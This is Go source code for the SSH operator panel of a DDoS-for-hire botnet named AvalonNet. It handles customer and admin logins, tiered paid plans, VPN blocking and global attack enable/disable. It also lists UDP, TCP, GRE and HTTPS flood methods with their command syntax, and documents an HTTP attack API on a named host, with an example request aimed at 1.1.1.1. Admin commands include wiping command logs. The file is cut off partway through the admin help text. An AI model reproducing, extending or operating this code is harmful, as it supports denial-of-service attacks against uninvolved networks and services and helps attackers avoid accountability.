package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

type Admin struct {
	conn             ssh.Channel
	sshConn          *ssh.ServerConn
	user             *AccountInfo
	lastBotCounts    map[string]int
	lastVectorCounts map[string]int
}

func NewAdmin(conn ssh.Channel, sshConn *ssh.ServerConn) *Admin {
	return &Admin{conn, sshConn, nil, make(map[string]int), make(map[string]int)}
}

func (this *Admin) Handle(requests <-chan *ssh.Request) {
	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				req.Reply(true, nil)
			case "pty-req":
				req.Reply(true, nil)
			case "window-change":
				req.Reply(true, nil)
			}
		}
	}()

	defer func() {
		this.conn.Close()
	}()

	// Banner and Login

	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\033]0;AvalonNet | Panel SSH\007"))
	this.conn.Write([]byte("	           ▄▄▄·  ▌ ▐· ▄▄▄· ▄▄▌         ▐ ▄ \r\n"))
	this.conn.Write([]byte("	        ▐█ ▀█ ▪█·█▌▐█ ▀█ ██•  ▪     •█▌▐█\r\n"))
	this.conn.Write([]byte("	        ▄█▀▀█ ▐█▐█•▄█▀▀█ ██▪   ▄█▀▄ ▐█▐▐▌\r\n"))
	this.conn.Write([]byte("	        ▐█ ▪▐▌ ███ ▐█ ▪▐▌▐█▌▐▌▐█▌.▐▌██▐█▌\r\n"))
	this.conn.Write([]byte(" 	         ▀  ▀ . ▀   ▀  ▀ .▀▀▀  ▀█▄▀▪▀▀ █▪\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("              A  V  A  L  O  N     B  O  T  N  E  T    \r\n"))
	this.conn.Write([]byte("\r\n"))

	this.conn.Write([]byte("\033[1;36m[ ? ] Username: \033[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.Write([]byte("\033[1;36m[ ? ] Password: \033[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	success, accountInfo := database.TryLogin(username, password)
	if !success {
		this.conn.Write([]byte("\033[1;31mAccess Denied.\r\n"))
		handleSSHLoginFailure(this.sshConn.RemoteAddr())
		time.Sleep(2 * time.Second)
		return
	}

	this.user = accountInfo

	clientIP, _, _ := net.SplitHostPort(this.sshConn.RemoteAddr().String())

	if accountInfo.admin == 0 {
		isVpn, err := IsVPN(clientIP)
		if err == nil && isVpn {
			this.conn.Write([]byte("\r\n\033[1;31mYour plan does not allow connecting via VPN/Proxy.\r\n"))
			time.Sleep(2 * time.Second)
			return
		}
	}

	database.LogUserLogin(accountInfo.IDs, clientIP)

	this.conn.Write([]byte("\r\n\033[01;37mVerify...\r\n"))
	for i := 0; i < 20; i++ {
		spinBuf := []string{"|", "/", "-", "\\"}
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
		this.conn.Write([]byte(fmt.Sprintf("\r\033[01;37mPlease wait... %s", spinBuf[i%len(spinBuf)])))
		time.Sleep(100 * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	this.DrawBanner()

	go func() {
		for {
			if err := this.UpdateTitle(); err != nil {
				return
			}
			time.Sleep(5 * time.Second)
		}
	}()

	for {
		this.conn.Write([]byte("\x1b[1;37;47m \x1b[1;37m" + this.user.username + " \x1b[1;34m● AvalonNet \033[0m\x1b[1;37m ➤➤ "))
		cmdLine, err := this.ReadLine(false)
		if err != nil || cmdLine == "exit" || cmdLine == "quit" {
			return
		}

		if cmdLine == "" || cmdLine == "@" {
			continue
		}

		fmt.Println("\033[0m " + this.user.username + ": " + cmdLine + "")

		parts := strings.Fields(cmdLine)
		if len(parts) == 0 {
			continue
		}

		rawCmd := parts[0]
		cmd := strings.ToLower(rawCmd)
		isDotCommand := strings.HasPrefix(cmd, ".")
		if isDotCommand {
			cmd = cmd[1:]
		}

		if len(cmd) > 0 {
			logLine := fmt.Sprintf("| username: %s | command: %s | ip: %s", this.user.username, cmdLine, this.sshConn.RemoteAddr())
			WriteLog(logLine)
		}

		if this.user.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm[y/n]: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[31;1mError creating admin.\033[0m\r\n"))
			} else {
				this.conn.Write([]byte("\033[32;1mAdmin created successfully.\033[0m\r\n"))
			}
			continue
		}

		if this.user.admin == 1 && cmd == "attack" {
			if len(parts) < 2 {
				this.conn.Write([]byte("\033[31;1mUsage: .attack [enable/disable]\033[0m\r\n"))
				continue
			}
			action := strings.ToLower(parts[1])
			if action == "enable" {
				atomic.StoreInt32(&AttacksEnabled, 1)
				this.conn.Write([]byte("\033[32;1mAttacks have been ENABLED globally.\033[0m\r\n"))
			} else if action == "disable" {
				atomic.StoreInt32(&AttacksEnabled, 0)
				this.conn.Write([]byte("\033[31;1mAttacks have been DISABLED globally.\033[0m\r\n"))
			} else {
				this.conn.Write([]byte("\033[31;1mInvalid action. Use enable or disable.\033[0m\r\n"))
			}
			this.UpdateTitle()
			continue
		}

		if cmd == "methods" || cmd == "method" {
			if this.user.planName == "free" {
				this.conn.Write([]byte("\r\n   \x1b[38;5;231m[ \x1b[38;5;196mFree Plan Methods \x1b[38;5;231m]\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m┌──────────────────────────────────────────────────────────────────────────────┐\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [ Layer 4 ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [   UDP   ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .udp         generic udp flood                                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .hex         udp flood random hex                                \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m└──────────────────────────────────────────────────────────────────────────────┘\r\n"))
			} else {
				this.conn.Write([]byte("\r\n   \x1b[38;5;231m[ \x1b[38;5;39mAvalonNet Premium Methods \x1b[38;5;231m]\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m┌───────────────────────────────────────────────────────────────────────────┐\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [ Layer 4 ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [   UDP   ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .udp         generic udp flood                                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .hex         udp flood random hex                                \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .game        specialized game method ( beta )                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .udpraw      generic udp raw flood                               \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .udpthreads  udp flood with more threads                         \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .udplegit    advanced udp bypass flood                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .ovh         advanced ovh hyper chaos bypass method              \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [   TCP   ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .ack         generic ack flood (with high pps)                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .syn         generic syn flood (with high pps)                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .tcpstomp    Strong TCP bypass                                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .tcpbypass   advanced tcp socket flood bypass                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [ Layer 7 ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .https       WinINet HTTPS flood  \x1b[1;36m[ Only windows ]\x1b[0m\x1b[38;5;231m              \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                            --- [ Layer 3 ] ---                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m         .gre         generic gre flood                                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m└───────────────────────────────────────────────────────────────────────────┘\r\n"))
			}
			this.conn.Write([]byte("\r\n   \x1b[38;5;240mUse '.syntax' for command usage.\x1b[39m\r\n\r\n"))
			continue
		}

		if cmd == "syntax" || cmd == ".syntax" {
			if this.user.planName == "free" {
				this.conn.Write([]byte("\r\n   \x1b[38;5;231m[ \x1b[38;5;196mFree Plan Syntax \x1b[38;5;231m]\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m┌──────────────────────────────────────────────────────────────────────────────┐\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.udp [ip] [port] [time] size=1400 sport=65535                         \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                            \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.hex [ip] [port] [time] size=1400 sport=65535                         \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m└──────────────────────────────────────────────────────────────────────────────┘\r\n"))
			} else {
				this.conn.Write([]byte("\r\n   \x1b[38;5;231m[ \x1b[38;5;39mAvalonNet Premium Syntax \x1b[38;5;231m]\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m┌─────────────────────────────────────────────────────────────────────┐\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                          --- [ Layer 4 ] ---                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                  \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.udp [ip] [port] [time] size=1400 sport=65535 bots=0                     \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                    \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.hex [ip] [port] [time] size=1400 sport=65535 bots=0                         \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                    \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.game [ip] [port] [time] size=1024 sport=65535 bots=0                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.udpraw [ip] [port] [time] size=1400 sport=65535 ttl=64 tos=0 bots=0     \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.udpthreads [ip] [port] [time] size=1400 threads=0                \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                    \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.ack [ip] [port] [time] sport=65535 size=0 ttl=64                  \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.syn [ip] [port] [time] sport=65535 size=0 ttl=64                  \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                    \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.tcpstomp [ip] [port] [time] sport=65535 size=768 ack=1           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.tcpbypass [ip] [port] [time] size=900 sport=65535 rand=1          \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.udplegit [ip] [port] [time] sport=65535                           \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.ovh [ip] [port] [time] domain=ovh.com threads=0                   \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                          --- [ Layer 7 ] ---                       \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \\x1b[38;5;196m│ \\x1b[38;5;125m                                                                    \\x1b[38;5;196m│\\r\\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                          --- [ Layer 3 ] ---                      \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;125m                                                                    \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m│ \x1b[38;5;231m.gre [ip] [port] [time] size=512 sport=65535 ttl=64                \x1b[38;5;196m│\r\n"))
				this.conn.Write([]byte("   \x1b[38;5;196m└─────────────────────────────────────────────────────────────────────┘\r\n"))
			}
			continue
		}

		if cmd == "notice" || cmd == "notices" || cmd == ".notice" || cmd == ".notices" || cmd == "uwu" || cmd == "UWU" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⡆⣐⢕⢕⢕⢕⢕⢕⢕⢕⠅⢗⢕⢕⢕⢕⢕⢕⢕⠕⠕⢕⢕⢕⢕⢕⢕⢕⢕⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢐⢕⢕⢕⢕⢕⣕⢕⢕⠕⠁⢕⢕⢕⢕⢕⢕⢕⢕⠅⡄⢕⢕⢕⢕⢕⢕⢕⢕⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⢕⢕⢕⠅⢗⢕⠕⣠⠄⣗⢕⢕⠕⢕⢕⢕⠕⢠⣿⠐⢕⢕⢕⠑⢕⢕⠵⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⢕⢕⠁⢜⠕⢁⣴⣿⡇⢓⢕⢵⢐⢕⢕⠕⢁⣾⢿⣧⠑⢕⢕⠄⢑⢕⠅⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⠵⢁⠔⢁⣤⣤⣶⣶⣶⡐⣕⢽⠐⢕⠕⣡⣾⣶⣶⣶⣤⡁⢓⢕⠄⢑⢅⢑\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⠍⣧⠄⣶⣾⣿⣿⣿⣿⣿⣿⣷⣔⢕⢄⢡⣾⣿⣿⣿⣿⣿⣿⣿⣦⡑⢕⢤⠱⢐\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢠⢕⠅⣾⣿⠋⢿⣿⣿⣿⠉⣿⣿⣷⣦⣶⣽⣿⣿⠈⣿⣿⣿⣿⠏⢹⣷⣷⡅⢐\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⣔⢕⢥⢻⣿⡀⠈⠛⠛⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⡀⠈⠛⠛⠁⠄⣼⣿⣿⡇⢔\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⢽⢸⢟⢟⢖⢖⢤⣶⡟⢻⣿⡿⠻⣿⣿⡟⢀⣿⣦⢤⢤⢔⢞⢿⢿⣿⠁⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⠅⣐⢕⢕⢕⢕⢕⣿⣿⡄⠛⢀⣦⠈⠛⢁⣼⣿⢗⢕⢕⢕⢕⢕⢕⡏⣘⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢕⢕⠅⢓⣕⣕⣕⣕⣵⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣷⣕⢕⢕⢕⢕⡵⢀⢕⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⢑⢕⠃⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⢕⢕⢕\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⣆⢕⠄⢱⣄⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⢕⢕⠕⢁\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m                         ⣿⣦⡀⣿⣿⣷⣶⣬⣍⣛⣛⣛⡛⠿⠿⠿⠛⠛⢛⣛⣉⣭⣤⣂⢜⠕⢑⣡⣴⣿\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m┌───────────────────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m│ \x1b[38;5;231m[ \x1b[38;5;125mLatest Notices & Updates \x1b[38;5;231m]                                              \x1b[38;5;125m│\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m├───────────────────────────────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m│ \x1b[38;5;231m- \x1b[38;5;231mAvalonNet v1.5 has been released!                                       \x1b[38;5;125m│\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m│ \x1b[38;5;231m- \x1b[38;5;231mNew attack methods added: .tcpbypass, .udplegit                         \x1b[38;5;125m│\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m│ \x1b[38;5;231m- \x1b[38;5;231mGlobal attack control (.attack enable/disable) is now live.             \x1b[38;5;125m│\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m│ \x1b[38;5;231m- \x1b[38;5;231mImproved banner and help categorization/separations.                    \x1b[38;5;125m│\r\n"))
			this.conn.Write([]byte("   \x1b[38;5;125m└───────────────────────────────────────────────────────────────────────────┘\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\r\n\x1b[1;36m  [ HELP ]\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .methods                   \x1b[38;5;253mShow all attack commands\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .syntax                    \x1b[38;5;253mShow command usage & flags\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .tools                     \x1b[38;5;253mShow all account & info tools\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .utils                     \x1b[38;5;253mShow session utility commands\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .plans                     \x1b[38;5;253mShow our plans & benefits\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .apidoc                    \x1b[38;5;253mAPI usage tutorial\r\n"))
			this.conn.Write([]byte("\x1b[1;33m  .notices                   \x1b[38;5;253mShow latest news & updates\r\n"))

			if this.user.admin == 1 {
				this.conn.Write([]byte("\r\n\x1b[1;31m  [ ADMIN ]\r\n"))
				this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\x1b[1;31m  .adminhelp                 \x1b[38;5;253mShow administrator commands\r\n"))
			}
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "cls" || cmd == "clear" {
			this.DrawBanner()
			continue
		}

		if cmd == "tools" || cmd == ".tools" {
			this.conn.Write([]byte("\r\n\x1b[1;36m  [ TOOLS ]\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .myinfo                    \x1b[38;5;253mShow your account info\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .apikey                    \x1b[38;5;253mGenerate/view your API key\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .ipinfo [ip]               \x1b[38;5;253mShow IP info\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .checkping [ip]            \x1b[38;5;253mCheck ping from multiple nodes\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .checktcp [ip] [port]      \x1b[38;5;253mCheck TCP connection\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .checkudp [ip] [port]      \x1b[38;5;253mCheck UDP connection\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .checkdns [domain]         \x1b[38;5;253mCheck DNS resolution\r\n"))
			this.conn.Write([]byte("\x1b[1;36m  .apidoc                    \x1b[38;5;253mAPI usage tutorial\r\n\r\n"))
			continue
		}

		if cmd == "plan" || cmd == ".plan" || cmd == "plans" || cmd == ".plans" {
			plans, err := database.FetchPlans()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %s\r\n", err.Error())))
				continue
			}

			this.conn.Write([]byte("\r\n \x1b[38;5;231m[ \x1b[38;5;125mAvalonNet Plans \x1b[38;5;231m]\r\n"))
			this.conn.Write([]byte("  \x1b[38;5;125m------------------------------------------------------------\x1b[39m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("  \x1b[38;5;125m║ \x1b[38;5;231m%-12s \x1b[38;5;125m║ \x1b[38;5;231m%-10s \x1b[38;5;125m║ \x1b[38;5;231m%-10s \x1b[38;5;125m║ \x1b[38;5;231m%-12s \x1b[38;5;125m║\x1b[39m\r\n", "Plan", "Max Time", "Cooldown", "Bots")))
			this.conn.Write([]byte("  \x1b[38;5;125m------------------------------------------------------------\x1b[39m\r\n"))

			for _, p := range plans {
				botStr := "Unlimited"
				if p.MaxBots != -1 {
					botStr = strconv.Itoa(p.MaxBots)
				}
				this.conn.Write([]byte(fmt.Sprintf("  \x1b[38;5;125m║ \x1b[39m\x1b[38;5;231m%-12s \x1b[38;5;125m║ \x1b[39m\x1b[38;5;231m%-10d \x1b[38;5;125m║ \x1b[39m\x1b[38;5;231m%-10d \x1b[38;5;125m║ \x1b[39m\x1b[38;5;231m%-12s \x1b[38;5;125m║\x1b[39m\r\n", p.Name, p.MaxTime, p.Cooldown, botStr)))
			}
			this.conn.Write([]byte("  \x1b[38;5;125m------------------------------------------------------------\x1b[39m\r\n\r\n"))
			continue
		}

		if cmd == "utils" || cmd == ".utils" {
			this.conn.Write([]byte("\r\n\x1b[1;35m  [ UTILS ]\r\n"))
			this.conn.Write([]byte("\x1b[1;35m  .rules                     \x1b[38;5;253mShow server rules\r\n"))
			this.conn.Write([]byte("\x1b[1;35m  cls / clear                \x1b[38;5;253mClear screen\r\n\r\n"))
			continue
		}

		if cmd == "apidoc" || cmd == ".apidoc" {
			this.conn.Write([]byte("\r\n\x1b[38;5;231m   [ \x1b[38;5;125mAVALONNET API DOCUMENTATION \x1b[38;5;231m]\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m   1. Obtener Key: \x1b[1;37mUsa el comando \x1b[1;33m.apikey \x1b[1;37men el panel.\r\n"))
			this.conn.Write([]byte("\x1b[1;36m   2. Endpoint:    \x1b[1;37mhttp://dcasdcas.online:8080\x1b[1;33m/api/attack\r\n"))
			this.conn.Write([]byte("\x1b[1;36m   3. Parámetros:\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m      - user     :\x1b[1;37m Tu nombre de usuario.\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m      - apikey   :\x1b[1;37m Tu clave API generada.\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m      - host     :\x1b[1;37m IP u objetivo a atacar.\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m      - port     :\x1b[1;37m Puerto del objetivo.\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m      - time     :\x1b[1;37m Duración en segundos.\r\n"))
			this.conn.Write([]byte("\\x1b[38;5;125m      - method   :\\x1b[1;37m Método de ataque (ej: udp, tcp).\\r\\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;33m   Ejemplo de Uso:\r\n"))
			this.conn.Write([]byte("\x1b[1;37m   http://dcasdcas.online:8080/api/attack?user=TU_USER&apikey=TU_KEY&host=1.1.1.1&port=80&time=60&method=udp\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;240m   Nota: Puedes añadir flags adicionales según el método (ej: size=1400).\r\n\r\n"))
			continue
		}

		if cmd == "adminhelp" || cmd == ".adminhelp" {
			if this.user.admin == 0 {
				this.conn.Write([]byte("\033[91mNo tienes permisos de administrador!\r\n"))
				continue
			}
			this.conn.Write([]byte("\r\n\x1b[1;31m  [ ADMIN COMMANDS ]\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .bots                      \x1b[38;5;253mShow bot count\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .going                     \x1b[38;5;253mShow real-time attacks\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .adduser                   \x1b[38;5;253mAdd a new user\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .addadmin                  \x1b[38;5;253mAdd a new admin\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .deluser [user]\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .blacklist [add/del] [ip] [mask]\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .remove                    \x1b[38;5;253mClear command logs\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .stats                     \x1b[38;5;253mShow server statistics\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .deletekey [key]           \x1b[38;5;253mDelete an API key\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .banapi [user]             \x1b[38;5;253mBan user from API\r\n"))
			this.conn.Write([]byte("\x1b[1;31m  .downloaderusers [webhook] [plan]\r\n"))
